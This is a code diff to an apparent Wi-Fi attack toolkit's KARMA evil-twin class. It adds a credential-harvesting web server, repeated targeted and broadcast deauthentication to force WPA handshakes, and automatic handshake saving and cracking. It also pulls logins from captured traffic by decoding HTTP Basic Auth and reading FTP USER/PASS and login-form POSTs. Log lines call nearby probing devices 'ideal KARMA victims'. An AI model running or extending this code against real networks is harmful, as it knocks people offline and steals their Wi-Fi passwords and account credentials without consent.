@@ -62,6 +62,9 @@ class AttackKARMA(Attack):
         self.captured_handshakes = {}  # MAC -> handshake file path
         self.cracked_passwords = {}    # MAC -> cracked password
         self.harvested_credentials = {} # MAC -> credentials dict
+        
+        # Create KARMA directories for permanent data storage
+        self.create_karma_directories()
         self.real_networks = []        # List of real networks with clients
         self.deauth_active = False     # Deauth attack status
         self.handshake_capture_active = False
@@ -1319,6 +1322,12 @@ class AttackKARMA(Attack):
                 Color.pattack('KARMA', self.target, 'Stage 5', 'Handshake capture active')
             self.start_handshake_capture()
             
+            # Stage 5.5: Start Web Server for Credential Harvesting (if enabled)
+            if getattr(Configuration, 'karma_credential_harvesting', False):
+                if hasattr(self, 'target') and self.target:
+                    Color.pattack('KARMA', self.target, 'Stage 5.5', 'Starting credential harvesting web server')
+                self.start_credential_harvesting_server()
+            
             # Stage 6: Complete Monitoring & Analysis
             if hasattr(self, 'target') and self.target:
                 Color.pattack('KARMA', self.target, 'Stage 6', 'Full monitoring active')
@@ -1390,6 +1399,11 @@ class AttackKARMA(Attack):
             
             Color.pl('')  # New line after progress
             
+            # Save probe captures to permanent directory
+            cap_files = airodump.find_files(endswith='.cap')
+            if cap_files:
+                self.save_probe_captures(cap_files[0])
+            
             if len(self.pnl_networks) >= Configuration.karma_min_probes:
                 Color.pl('{+} {G}Successfully captured {C}%d{W} networks from PNL{W}' % len(self.pnl_networks))
                 for ssid in sorted(self.pnl_networks):
@@ -1406,25 +1420,26 @@ class AttackKARMA(Attack):
                 return False
     
     def parse_probe_requests(self, capfile):
-        """Parse probe requests from PCAP file using tshark"""
+        """Parse probe requests from PCAP file using tshark - Enhanced implementation"""
         if not Tshark.exists():
             Color.pl('{!} {R}Warning: tshark not found, cannot parse probe requests{W}')
             return
         
         try:
-            # Use tshark to extract probe requests with better filtering
+            # Enhanced tshark command with better filtering
             command = [
                 'tshark',
                 '-r', capfile,
                 '-n',  # Don't resolve addresses
-                '-Y', 'wlan.fc.type_subtype == 0x04 and wlan.ssid != ""',  # Probe request frames with SSID
+                '-Y', 'wlan.fc.type_subtype == 0x04 and wlan.ssid != "" and wlan.ssid != "<MISSING>"',  # Better filtering
                 '-T', 'fields',
                 '-e', 'wlan.sa',  # Source MAC
-                '-e', 'wlan.ssid'  # SSID
+                '-e', 'wlan.ssid',  # SSID
+                '-e', 'wlan.ta'  # Transmitter address (for debugging)
             ]
             
             process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-            stdout, stderr = process.communicate()
+            stdout, stderr = process.communicate(timeout=30)  # Add timeout
             
             if process.returncode != 0:
                 if Configuration.verbose > 1:
@@ -1442,23 +1457,25 @@ class AttackKARMA(Attack):
                     client_mac = parts[0].strip()
                     ssid = parts[1].strip()
                     
-                    # Validate MAC address format
+                    # Enhanced MAC validation
                     if not self.is_valid_mac(client_mac):
                         continue
                     
                     if client_mac and ssid and ssid != '' and ssid != '<MISSING>':
-                        # Convert hex-encoded SSIDs to readable text
+                        # Enhanced SSID decoding
                         readable_ssid = self.decode_hex_ssid(ssid)
                         
                         # Skip empty or invalid SSIDs
-                        if readable_ssid and len(readable_ssid.strip()) > 0:
+                        if readable_ssid and len(readable_ssid.strip()) > 0 and readable_ssid != '<MISSING>':
                             self.client_probes[client_mac].append(readable_ssid)
                             self.pnl_networks.add(readable_ssid)
                             parsed_count += 1
             
             if parsed_count > 0 and Configuration.verbose > 1:
-                Color.pl('{+} {G}Parsed {C}%d{W} probe requests{W}' % parsed_count)
-                        
+                Color.pl('{+} {C}Parsed {G}%d{W} probe requests{W}' % parsed_count)
+                
+        except subprocess.TimeoutExpired:
+            Color.pl('{!} {R}Probe parsing timeout - file may be too large{W}')
         except Exception as e:
             if Configuration.verbose > 1:
                 Color.pl('{!} {R}Error parsing probe requests: {O}%s{W}' % str(e))
@@ -1528,13 +1545,15 @@ class AttackKARMA(Attack):
                         for client in target.clients:
                             Color.pl('  {G}* {W}Client: {C}%s{W}' % client.station)
                 
-                # Also check for unassociated clients (probe requests)
+                # Also check for unassociated clients (probe requests) - these are VALUABLE for KARMA!
                 unassociated_targets = [t for t in targets if t.bssid == 'UNASSOCIATED' and t.clients]
                 if unassociated_targets:
                     unassociated_target = unassociated_targets[0]
-                    Color.pl('{+} {C}Found {G}%d{W} unassociated clients (probe requests){W}' % len(unassociated_target.clients))
+                    Color.pl('{+} {G}Found {C}%d{W} unassociated clients (active probe requests - perfect for KARMA!){W}' % len(unassociated_target.clients))
+                    Color.pl('{+} {C}These devices are actively searching for networks - ideal KARMA victims!{W}')
                     for client in unassociated_target.clients:
-                        Color.pl('  {G}* {W}Unassociated: {C}%s{W}' % client.station)
+                        Color.pl('  {G}* {W}Probing device: {C}%s{W}' % client.station)
+                    Color.pl('{+} {C}These unassociated clients will connect to your Evil Twin APs!{W}')
                 
                 # Mark that networks have been scanned
                 self._networks_scanned = True
@@ -1819,6 +1838,11 @@ class AttackKARMA(Attack):
         except Exception as e:
             Color.pl('{!} {R}Error during interface cleanup: {O}%s{W}' % str(e))
     
+    def stop(self):
+        """Stop the KARMA attack - interface method for GUI compatibility"""
+        self.running = False
+        self.stop_all_processes()
+        
     def stop_all_processes(self):
         """Stop all running processes"""
         try:
@@ -2023,6 +2047,11 @@ class AttackKARMA(Attack):
     
     def start_handshake_capture(self):
         """Start handshake capture for WPA/WPA2 networks"""
+        # Check if handshake cracking is enabled
+        if not getattr(Configuration, 'karma_handshake_cracking', False):
+            Color.pl('{+} {C}Handshake capture disabled in configuration{W}')
+            return False
+            
         Color.pl('\n{+} {C}Stage 5: Starting handshake capture{W}')
         
         try:
@@ -2183,23 +2212,50 @@ class AttackKARMA(Attack):
                 Color.pl('{!} {R}Error monitoring process health: {O}%s{W}' % str(e))
     
     def acquire_interface_lock(self, interface, operation_name):
-        """Acquire a lock for interface operations to prevent conflicts"""
+        """Acquire a lock for interface operations to prevent conflicts - Enhanced implementation"""
         try:
             if interface not in self._interface_locks:
                 self._interface_locks[interface] = threading.Lock()
             
-            # Try to acquire lock with timeout
-            acquired = self._interface_locks[interface].acquire(timeout=5)
+            # Check if lock is already held by current thread (avoid deadlock)
+            current_thread_id = threading.get_ident()
+            if interface in self._interface_operations:
+                existing_operation = self._interface_operations[interface]
+                if existing_operation['thread_id'] == current_thread_id:
+                    # Same thread already holds the lock, allow re-entry
+                    Color.pl('{+} {C}Re-entering interface lock for {G}%s{W}: {C}%s{W}' % (interface, operation_name))
+                    return True
+            
+            # Try to acquire lock with shorter timeout for better responsiveness
+            acquired = self._interface_locks[interface].acquire(timeout=2)
             if acquired:
                 self._interface_operations[interface] = {
                     'operation': operation_name,
                     'start_time': time.time(),
-                    'thread_id': threading.get_ident()
+                    'thread_id': current_thread_id
                 }
-                Color.pl('{+} {C}Acquired interface lock for {G}%s{W}: {C}%s{W}' % (interface, operation_name))
+                if Configuration.verbose > 1:
+                    Color.pl('{+} {C}Acquired interface lock for {G}%s{W}: {C}%s{W}' % (interface, operation_name))
                 return True
             else:
-                Color.pl('{!} {R}Failed to acquire interface lock for {O}%s{W}: {O}%s{W}' % (interface, operation_name))
+                # Check if existing operation is stale (older than 30 seconds)
+                if interface in self._interface_operations:
+                    existing_operation = self._interface_operations[interface]
+                    if time.time() - existing_operation['start_time'] > 30:
+                        Color.pl('{!} {R}Stale interface lock detected for {O}%s{W}, forcing release{W}' % interface)
+                        self._force_release_interface_lock(interface)
+                        # Try again
+                        acquired = self._interface_locks[interface].acquire(timeout=2)
+                        if acquired:
+                            self._interface_operations[interface] = {
+                                'operation': operation_name,
+                                'start_time': time.time(),
+                                'thread_id': current_thread_id
+                            }
+                            return True
+                
+                if Configuration.verbose > 1:
+                    Color.pl('{!} {R}Failed to acquire interface lock for {O}%s{W}: {O}%s{W}' % (interface, operation_name))
                 return False
                 
         except Exception as e:
@@ -2223,6 +2279,44 @@ class AttackKARMA(Attack):
         except Exception as e:
             if Configuration.verbose > 1:
                 Color.pl('{!} {R}Error releasing interface lock: {O}%s{W}' % str(e))
+    
+    def _force_release_interface_lock(self, interface):
+        """Force release a stale interface lock"""
+        try:
+            if interface in self._interface_locks:
+                # Force release the lock
+                try:
+                    self._interface_locks[interface].release()
+                except:
+                    pass  # Lock might not be held
+                
+                # Clean up operation tracking
+                if interface in self._interface_operations:
+                    del self._interface_operations[interface]
+                
+                Color.pl('{!} {R}Force released stale interface lock for {O}%s{W}' % interface)
+                
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error force releasing interface lock: {O}%s{W}' % str(e))
+    
+    def cleanup_stale_interface_locks(self):
+        """Clean up stale interface locks that have been held too long"""
+        try:
+            current_time = time.time()
+            stale_interfaces = []
+            
+            for interface, operation_info in self._interface_operations.items():
+                if current_time - operation_info['start_time'] > 60:  # 60 seconds timeout
+                    stale_interfaces.append(interface)
+            
+            for interface in stale_interfaces:
+                Color.pl('{!} {R}Cleaning up stale interface lock for {O}%s{W}' % interface)
+                self._force_release_interface_lock(interface)
+                
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error cleaning up stale interface locks: {O}%s{W}' % str(e))
     
     def check_interface_conflicts(self):
         """Check for interface conflicts and resolve them"""
@@ -2428,6 +2522,9 @@ class AttackKARMA(Attack):
             # Send deauth to trigger handshake (CRITICAL FIX)
             self.trigger_handshake_with_deauth(ap_bssid, client_mac)
             
+            # Wait a moment for deauth to take effect
+            time.sleep(2)
+            
             # Use safe interface operation for airodump
             def capture_operation():
                 with Airodump(interface=self.probe_interface,
@@ -2435,12 +2532,24 @@ class AttackKARMA(Attack):
                              output_file_prefix='karma_handshake_%s' % client_mac.replace(':', ''),
                              delete_existing_files=True) as airodump:
                     
-                    # Monitor for handshake with extended timeout
-                    timer = Timer(60)  # Increased timeout for better success rate
+                    # Monitor for handshake with extended timeout and more aggressive approach
+                    timer = Timer(120)  # Increased timeout to 120 seconds for better success rate
                     handshake_found = False
                     last_check_time = time.time()
+                    deauth_attempts = 0
+                    max_deauth_attempts = 5  # Increased from 3 to 5 attempts
+                    
+                    Color.pl('{+} {C}Starting handshake capture for {G}%s{W} (timeout: 120s){W}' % client_mac)
                     
                     while not timer.ended() and not handshake_found and self.running:
+                        # Send additional deauth attempts every 15 seconds (reduced from 20)
+                        if deauth_attempts < max_deauth_attempts and (time.time() - last_check_time) > 15:
+                            Color.pl('{+} {C}Sending additional deauth to trigger handshake for {G}%s{W} (attempt %d/%d){W}' % 
+                                    (client_mac, deauth_attempts + 1, max_deauth_attempts))
+                            self.trigger_handshake_with_deauth(ap_bssid, client_mac)
+                            deauth_attempts += 1
+                            last_check_time = time.time()
+                        
                         # Check if handshake was captured
                         cap_files = airodump.find_files(endswith='.cap')
                         if cap_files:
@@ -2450,8 +2559,15 @@ class AttackKARMA(Attack):
                                 Color.pl('{+} {G}WPA handshake captured from {C}%s{W}!' % client_mac)
                                 handshake_found = True
                                 
+                                # Save handshake to permanent directory
+                                self.save_karma_handshake(cap_files[0], client_mac, ap_bssid)
+                                
                                 # Attempt to crack the handshake asynchronously
                                 self.crack_handshake_async(client_mac, cap_files[0])
+                            else:
+                                # Show progress if no valid handshake yet
+                                if Configuration.verbose > 1:
+                                    Color.pl('{+} {O}Checking for handshake in {C}%s{W}...' % cap_files[0])
                         
                         # Adaptive sleep based on activity
                         current_time = time.time()
@@ -2463,16 +2579,16 @@ class AttackKARMA(Attack):
                         last_check_time = current_time
                     
                     if not handshake_found:
-                        Color.pl('{!} {R}No handshake captured from {O}%s{W} after 60 seconds' % client_mac)
+                        Color.pl('{!} {R}No handshake captured from {O}%s{W} after 120 seconds' % client_mac)
                         # Retry handshake capture after a delay
                         self.retry_handshake_capture(client_mac)
                     
                     return handshake_found
             
-            # Execute capture operation safely
+            # Execute capture operation safely with shorter operation name
             handshake_found = self.safe_interface_operation(
                 self.probe_interface, 
-                f'handshake_capture_{client_mac}', 
+                'handshake_capture',  # Shorter name instead of including MAC
                 capture_operation
             )
                     
@@ -2489,9 +2605,9 @@ class AttackKARMA(Attack):
         self.start_async_handshake_capture(client_mac)
     
     def _get_rogue_ap_bssid(self):
-        """Get the BSSID of our rogue AP"""
+        """Get the BSSID of our rogue AP - Enhanced implementation"""
         try:
-            # Get the MAC address of our rogue interface
+            # Method 1: Get the MAC address of our rogue interface
             cmd = ['ip', 'link', 'show', self.rogue_interface]
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
             
@@ -2503,7 +2619,7 @@ class AttackKARMA(Attack):
                         if mac_match:
                             return mac_match.group(1).lower()
             
-            # Fallback: try to get from hostapd config if available
+            # Method 2: Try to get from hostapd config if available
             if hasattr(self, 'hostapd_config') and self.hostapd_config:
                 try:
                     with open(self.hostapd_config, 'r') as f:
@@ -2513,6 +2629,32 @@ class AttackKARMA(Attack):
                             return bssid_match.group(1).lower()
                 except Exception:
                     pass
+            
+            # Method 3: Try to get from iw command
+            try:
+                cmd = ['iw', 'dev', self.rogue_interface, 'info']
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
+                if result.returncode == 0:
+                    for line in result.stdout.split('\n'):
+                        if 'addr' in line:
+                            mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
+                            if mac_match:
+                                return mac_match.group(1).lower()
+            except Exception:
+                pass
+            
+            # Method 4: Try to get from ifconfig
+            try:
+                cmd = ['ifconfig', self.rogue_interface]
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
+                if result.returncode == 0:
+                    for line in result.stdout.split('\n'):
+                        if 'HWaddr' in line or 'ether' in line:
+                            mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
+                            if mac_match:
+                                return mac_match.group(1).lower()
+            except Exception:
+                pass
             
             return None
             
@@ -2568,13 +2710,32 @@ class AttackKARMA(Attack):
     def validate_handshake_async(self, capfile):
         """Validate handshake asynchronously to prevent blocking - Fixed implementation"""
         try:
-            # Use timeout to prevent blocking
-            cmd = ['aircrack-ng', capfile]
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
+            if not os.path.exists(capfile):
+                return False
+                
+            # Use aircrack-ng to validate handshake (more reliable)
+            cmd = ['aircrack-ng', '-J', '/tmp/test_handshake', capfile]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
             
-            # More robust handshake detection
-            output = result.stdout.lower()
-            return ('wpa' in output and 'handshake' in output) or '1 handshake' in output
+            # Check if aircrack-ng found a valid handshake
+            if result.returncode == 0 and '1 handshake' in result.stdout:
+                return True
+            
+            # Fallback: Use tshark to check for EAPOL frames
+            cmd = ['tshark', '-r', capfile, '-T', 'fields', '-e', 'wlan.fc.type_subtype', '-e', 'eapol.type']
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            
+            if result.returncode == 0:
+                lines = result.stdout.strip().split('\n')
+                eapol_count = 0
+                for line in lines:
+                    if line.strip() and ('0x8' in line or 'eapol' in line.lower()):
+                        eapol_count += 1
+                
+                # Need at least 4 EAPOL frames for complete handshake
+                return eapol_count >= 4
+            
+            return False
             
         except subprocess.TimeoutExpired:
             if Configuration.verbose > 1:
@@ -2634,20 +2795,53 @@ class AttackKARMA(Attack):
             return None
     
     def trigger_handshake_with_deauth(self, ap_bssid, client_mac):
-        """Send deauth frames to trigger handshake - CRITICAL FIX"""
+        """Send deauth frames to trigger handshake - Enhanced implementation"""
         try:
             Color.pl('{+} {C}Sending deauth to trigger handshake: AP {G}%s{W} -> Client {G}%s{W}' % (ap_bssid, client_mac))
             
-            # Send deauth from AP to client
-            deauth_cmd = ['aireplay-ng', '-0', '3', '-a', ap_bssid, '-c', client_mac, self.probe_interface]
-            subprocess.run(deauth_cmd, capture_output=True, timeout=5)
+            # Send more aggressive deauth packets for better success rate
+            deauth_cmd = [
+                'aireplay-ng', 
+                '-0', '8',  # Increased from 5 to 8 packets for better success
+                '--ignore-negative-one',  # Ignore negative one errors
+                '-a', ap_bssid, 
+                '-c', client_mac, 
+                self.probe_interface
+            ]
+            
+            result = subprocess.run(deauth_cmd, capture_output=True, timeout=8)
+            if result.returncode != 0 and Configuration.verbose > 1:
+                Color.pl('{!} {R}Deauth command failed: {O}%s{W}' % result.stderr.decode())
             
             # Small delay to let deauth take effect
-            time.sleep(1)
+            time.sleep(2)
             
-            # Send deauth from client to AP (reverse direction)
-            deauth_cmd_reverse = ['aireplay-ng', '-0', '2', '-a', ap_bssid, '-c', client_mac, self.probe_interface]
-            subprocess.run(deauth_cmd_reverse, capture_output=True, timeout=5)
+            # Send deauth from client to AP (reverse direction) - more aggressive
+            deauth_cmd_reverse = [
+                'aireplay-ng', 
+                '-0', '5',  # Increased from 3 to 5 packets
+                '--ignore-negative-one',
+                '-a', ap_bssid, 
+                '-c', client_mac, 
+                self.probe_interface
+            ]
+            
+            result = subprocess.run(deauth_cmd_reverse, capture_output=True, timeout=8)
+            if result.returncode != 0 and Configuration.verbose > 1:
+                Color.pl('{!} {R}Reverse deauth command failed: {O}%s{W}' % result.stderr.decode())
+            
+            # Additional broadcast deauth for better coverage
+            broadcast_deauth = [
+                'aireplay-ng',
+                '-0', '3',
+                '--ignore-negative-one',
+                '-a', ap_bssid,
+                self.probe_interface
+            ]
+            
+            result = subprocess.run(broadcast_deauth, capture_output=True, timeout=5)
+            if result.returncode != 0 and Configuration.verbose > 1:
+                Color.pl('{!} {R}Broadcast deauth command failed: {O}%s{W}' % result.stderr.decode())
             
             Color.pl('{+} {G}Deauth frames sent successfully{W}')
             
@@ -2657,6 +2851,11 @@ class AttackKARMA(Attack):
     
     def crack_handshake_async(self, client_mac, handshake_file):
         """Attempt to crack captured WPA handshake asynchronously"""
+        # Check if handshake cracking is enabled
+        if not getattr(Configuration, 'karma_handshake_cracking', False):
+            Color.pl('{+} {C}Handshake cracking disabled - skipping password attempt{W}')
+            return
+            
         try:
             # Start cracking in background thread
             crack_thread = threading.Thread(
@@ -2877,6 +3076,11 @@ class AttackKARMA(Attack):
                     Color.pl('{+} {G}Credentials harvested from {C}%s{W}:{W}' % client_mac)
                     for cred in credentials_found:
                         Color.pl('  {G}* {W}%s{W}' % cred)
+                    
+                    # Save credential data to permanent directory
+                    cap_files = airodump.find_files(endswith='.cap')
+                    if cap_files:
+                        self.save_credential_data(cap_files[0], client_mac, credentials_found)
                         
                     if hasattr(self, 'target') and self.target:
                         Color.pattack('KARMA', self.target, 'Credentials Harvested', f'{client_mac}: {len(credentials_found)} credentials')
@@ -2885,65 +3089,357 @@ class AttackKARMA(Attack):
             if Configuration.verbose > 1:
                 Color.pl('{!} {R}Error harvesting credentials: {O}%s{W}' % str(e))
     
+    def capture_client_traffic(self, client_mac):
+        """Capture general traffic from a connected client"""
+        try:
+            Color.pl('{+} {C}Capturing traffic from {G}%s{W}...' % client_mac)
+            
+            # FIXED: Capture on the rogue interface (where AP traffic flows) without BSSID filter
+            # This captures all traffic on the AP interface, including data frames
+            with Airodump(interface=self.rogue_interface,
+                         target_bssid=None,  # Capture all traffic, not filtered by BSSID
+                         output_file_prefix='karma_traffic_%s' % client_mac.replace(':', ''),
+                         delete_existing_files=True) as airodump:
+                
+                # Monitor for 60 seconds to capture general traffic
+                timer = Timer(60)
+                
+                while not timer.ended() and self.running:
+                    time.sleep(10)  # Check every 10 seconds
+                
+                # Save traffic capture to permanent directory
+                cap_files = airodump.find_files(endswith='.cap')
+                if cap_files:
+                    self.save_traffic_capture(cap_files[0], client_mac)
+                
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error capturing client traffic: {O}%s{W}' % str(e))
+    
     def analyze_traffic_for_credentials(self, capfile):
-        """Analyze captured traffic for login credentials"""
+        """Enhanced traffic analysis for credentials and sensitive data"""
         try:
             credentials = []
             
-            # Look for HTTP POST requests (login forms)
+            # Check if file exists and is accessible
+            if not os.path.exists(capfile) or not os.access(capfile, os.R_OK):
+                Color.pl('{!} {R}PCAP file not accessible: {O}%s{W}' % capfile)
+                return credentials
+            
+            # Look for HTTP POST requests (login forms) - Enhanced
             http_cmd = [
                 'tshark',
                 '-r', capfile,
                 '-Y', 'http.request.method == POST',
                 '-T', 'fields',
+                '-e', 'frame.time',
+                '-e', 'ip.src',
+                '-e', 'ip.dst',
                 '-e', 'http.host',
                 '-e', 'http.request.uri',
                 '-e', 'http.file_data'
             ]
             
-            result = subprocess.run(http_cmd, capture_output=True, text=True)
+            result = subprocess.run(http_cmd, capture_output=True, text=True, timeout=30)
             if result.returncode == 0 and result.stdout.strip():
                 lines = result.stdout.split('\n')
                 for line in lines:
                     if line.strip():
                         parts = line.split('\t')
-                        if len(parts) >= 3:
-                            host = parts[0]
-                            uri = parts[1]
-                            data = parts[2] if len(parts) > 2 else ''
+                        if len(parts) >= 6:
+                            timestamp = parts[0]
+                            src_ip = parts[1]
+                            dst_ip = parts[2]
+                            host = parts[3]
+                            uri = parts[4]
+                            data = parts[5] if len(parts) > 5 else ''
                             
-                            # Look for common login form fields
-                            if any(field in data.lower() for field in ['password', 'passwd', 'pwd', 'login', 'username', 'user']):
-                                cred_info = f"Login attempt: {host}{uri}"
-                                if 'username' in data.lower() or 'user' in data.lower():
-                                    cred_info += " (Username found)"
-                                if 'password' in data.lower() or 'passwd' in data.lower():
-                                    cred_info += " (Password found)"
-                                
+                            # Enhanced credential detection
+                            cred_info = self.extract_credentials_from_data(data, host, uri, timestamp, src_ip)
+                            if cred_info:
                                 credentials.append(cred_info)
             
-            # Look for HTTP Basic Auth
+            # Look for HTTP Basic Auth - Enhanced
             basic_auth_cmd = [
                 'tshark',
                 '-r', capfile,
                 '-Y', 'http.authorization',
                 '-T', 'fields',
+                '-e', 'frame.time',
+                '-e', 'ip.src',
                 '-e', 'http.host',
                 '-e', 'http.authorization'
             ]
             
-            result = subprocess.run(basic_auth_cmd, capture_output=True, text=True)
+            result = subprocess.run(basic_auth_cmd, capture_output=True, text=True, timeout=30)
             if result.returncode == 0 and result.stdout.strip():
                 lines = result.stdout.split('\n')
                 for line in lines:
-                    if line.strip() and 'Basic' in line:
-                        credentials.append(f"HTTP Basic Auth: {line}")
+                    if line.strip():
+                        parts = line.split('\t')
+                        if len(parts) >= 4:
+                            timestamp = parts[0]
+                            src_ip = parts[1]
+                            host = parts[2]
+                            auth = parts[3]
+                            
+                            # Decode Basic Auth
+                            if auth.startswith('Basic '):
+                                try:
+                                    import base64
+                                    decoded = base64.b64decode(auth[6:]).decode('utf-8')
+                                    if ':' in decoded:
+                                        username, password = decoded.split(':', 1)
+                                        cred_info = f"Basic Auth: {host} - User: {username}, Pass: {password[:10]}..."
+                                        credentials.append(cred_info)
+                                except Exception:
+                                    pass
+            
+            # Look for FTP credentials
+            ftp_cmd = [
+                'tshark',
+                '-r', capfile,
+                '-Y', 'ftp.request.command == USER or ftp.request.command == PASS',
+                '-T', 'fields',
+                '-e', 'frame.time',
+                '-e', 'ip.src',
+                '-e', 'ftp.request.command',
+                '-e', 'ftp.request.arg'
+            ]
+            
+            result = subprocess.run(ftp_cmd, capture_output=True, text=True, timeout=30)
+            if result.returncode == 0 and result.stdout.strip():
+                ftp_creds = {}
+                lines = result.stdout.split('\n')
+                for line in lines:
+                    if line.strip():
+                        parts = line.split('\t')
+                        if len(parts) >= 4:
+                            timestamp = parts[0]
+                            src_ip = parts[1]
+                            command = parts[2]
+                            arg = parts[3]
+                            
+                            if command == 'USER':
+                                ftp_creds[src_ip] = {'user': arg, 'pass': None}
+                            elif command == 'PASS' and src_ip in ftp_creds:
+                                ftp_creds[src_ip]['pass'] = arg
+                                cred_info = f"FTP Login: {src_ip} - User: {ftp_creds[src_ip]['user']}, Pass: {arg[:10]}..."
+                                credentials.append(cred_info)
+            
+            # Look for DNS queries (potential data exfiltration)
+            dns_cmd = [
+                'tshark',
+                '-r', capfile,
+                '-Y', 'dns.flags.response == 0',
+                '-T', 'fields',
+                '-e', 'frame.time',
+                '-e', 'ip.src',
+                '-e', 'dns.qry.name'
+            ]
+            
+            result = subprocess.run(dns_cmd, capture_output=True, text=True, timeout=30)
+            if result.returncode == 0 and result.stdout.strip():
+                suspicious_domains = []
+                lines = result.stdout.split('\n')
+                for line in lines:
+                    if line.strip():
+                        parts = line.split('\t')
+                        if len(parts) >= 3:
+                            timestamp = parts[0]
+                            src_ip = parts[1]
+                            domain = parts[2]
+                            
+                            # Check for suspicious domains
+                            if self.is_suspicious_domain(domain):
+                                suspicious_domains.append(f"Suspicious DNS: {src_ip} -> {domain}")
+                
+                if suspicious_domains:
+                    credentials.extend(suspicious_domains[:5])  # Limit to 5 most suspicious
             
             return credentials
             
         except Exception as e:
-            if Configuration.verbose > 1:
-                Color.pl('{!} {R}Error analyzing traffic: {O}%s{W}' % str(e))
+            Color.pl('{!} {R}Error analyzing traffic: {O}%s{W}' % str(e))
+            return []
+    
+    def extract_credentials_from_data(self, data, host, uri, timestamp, src_ip):
+        """Extract credentials from HTTP POST data"""
+        try:
+            if not data:
+                return None
+            
+            data_lower = data.lower()
+            cred_info = None
+            
+            # Look for common login form fields
+            if any(field in data_lower for field in ['password', 'passwd', 'pwd', 'login', 'username', 'user']):
+                cred_info = f"Login Form: {host}{uri} from {src_ip}"
+                
+                # Try to extract actual values
+                if 'username=' in data_lower or 'user=' in data_lower:
+                    cred_info += " (Username field found)"
+                if 'password=' in data_lower or 'passwd=' in data_lower:
+                    cred_info += " (Password field found)"
+                
+                # Look for email patterns
+                import re
+                email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
+                emails = re.findall(email_pattern, data)
+                if emails:
+                    cred_info += f" (Email: {emails[0]})"
+            
+            return cred_info
+            
+        except Exception:
+            return None
+    
+    def is_suspicious_domain(self, domain):
+        """Check if a domain is suspicious for data exfiltration"""
+        try:
+            suspicious_keywords = [
+                'exfil', 'steal', 'leak', 'dump', 'backup', 'data',
+                'secret', 'private', 'confidential', 'internal'
+            ]
+            
+            domain_lower = domain.lower()
+            return any(keyword in domain_lower for keyword in suspicious_keywords)
+            
+        except Exception:
+            return False
+    
+    def start_live_monitoring(self, interface=None):
+        """Start live monitoring with Wireshark integration"""
+        try:
+            monitor_interface = interface or self.probe_interface
+            if not monitor_interface:
+                Color.pl('{!} {R}No interface available for live monitoring{W}')
+                return False
+            
+            Color.pl('{+} {G}Starting live monitoring on interface {C}%s{W}...' % monitor_interface)
+            
+            # Create live monitoring directory
+            live_dir = os.path.join(Configuration.karma_captures_dir, 'live_monitoring')
+            if not os.path.exists(live_dir):
+                os.makedirs(live_dir, exist_ok=True)
+            
+            # Start continuous capture with tshark
+            timestamp = time.strftime('%Y%m%d_%H%M%S')
+            live_cap_file = os.path.join(live_dir, f'live_monitoring_{timestamp}.pcap')
+            
+            # Start tshark in background for live capture
+            tshark_cmd = [
+                'tshark',
+                '-i', monitor_interface,
+                '-w', live_cap_file,
+                '-f', 'wlan',  # Capture only wireless traffic
+                '-b', 'filesize:10000',  # Rotate files every 10MB
+                '-b', 'files:10'  # Keep only 10 files
+            ]
+            
+            self.live_monitor_process = subprocess.Popen(
+                tshark_cmd,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            
+            Color.pl('{+} {G}Live monitoring started: {C}%s{W}' % live_cap_file)
+            Color.pl('{+} {C}You can open this file in Wireshark for real-time analysis{W}')
+            
+            # Start real-time analysis thread
+            self.live_analysis_thread = threading.Thread(
+                target=self.real_time_traffic_analysis,
+                args=(live_cap_file,),
+                name='live_analysis'
+            )
+            self.live_analysis_thread.daemon = True
+            self.live_analysis_thread.start()
+            
+            return True
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error starting live monitoring: {O}%s{W}' % str(e))
+            return False
+    
+    def stop_live_monitoring(self):
+        """Stop live monitoring"""
+        try:
+            if hasattr(self, 'live_monitor_process') and self.live_monitor_process:
+                self.live_monitor_process.terminate()
+                self.live_monitor_process.wait(timeout=5)
+                Color.pl('{+} {G}Live monitoring stopped{W}')
+            
+            if hasattr(self, 'live_analysis_thread') and self.live_analysis_thread.is_alive():
+                # The thread will stop when self.running becomes False
+                pass
+                
+        except Exception as e:
+            Color.pl('{!} {R}Error stopping live monitoring: {O}%s{W}' % str(e))
+    
+    def real_time_traffic_analysis(self, capfile):
+        """Real-time traffic analysis for live monitoring"""
+        try:
+            Color.pl('{+} {C}Starting real-time traffic analysis...{W}')
+            last_size = 0
+            
+            while self.running:
+                try:
+                    # Check if file exists and has grown
+                    if os.path.exists(capfile):
+                        current_size = os.path.getsize(capfile)
+                        if current_size > last_size and current_size > 1024:  # At least 1KB
+                            
+                            # Analyze new traffic
+                            credentials = self.analyze_traffic_for_credentials(capfile)
+                            if credentials:
+                                Color.pl('{+} {G}Real-time credentials detected:{W}')
+                                for cred in credentials[:3]:  # Show only first 3
+                                    Color.pl('  {G}* {W}%s{W}' % cred)
+                            
+                            # Check for new clients
+                            new_clients = self.detect_new_clients(capfile)
+                            if new_clients:
+                                Color.pl('{+} {C}New clients detected:{W}')
+                                for client in new_clients:
+                                    Color.pl('  {C}* {W}%s{W}' % client)
+                            
+                            last_size = current_size
+                    
+                    time.sleep(10)  # Check every 10 seconds
+                    
+                except Exception as e:
+                    if Configuration.verbose > 1:
+                        Color.pl('{!} {R}Error in real-time analysis: {O}%s{W}' % str(e))
+                    time.sleep(5)
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error in real-time traffic analysis: {O}%s{W}' % str(e))
+    
